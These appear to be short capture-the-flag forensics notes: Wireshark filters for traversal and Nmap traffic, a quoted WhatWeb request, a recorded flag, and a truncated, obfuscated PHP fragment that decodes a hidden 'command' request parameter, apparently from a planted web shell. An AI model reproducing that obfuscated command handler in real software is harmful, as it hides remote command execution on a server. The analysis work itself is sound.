# Notes

Filtre pr params:
```bash
http.request.uri contains "?" && !(http.response.code == 404)
!(http.response.code == 404) and ip.src == 192.168.1.5 and http and http.request.uri contains ".."
http.user_agent contains "Nmap"
http and http.request.uri.query.parameter
http.request and frame matches "ASDE"
```

Streams exclus:
```bash
67381,
```
Streams intéressants:
```bash
tcp.stream eq 67407

GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1
User-Agent: WhatWeb/0.5.5
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
Connection: close
Host: 192.168.1.5:7426
```


BDSEC{57_c0M1and}

isset($_REQUEST["\143\60\115\141\116\144"]) && !empty($_REQUEST["\x63\x30\115\x61\116\144"])) { $key = 1337 % 256; $encrypted = base64_decode($_REQUEST["\x63\60\115\141\116\144"]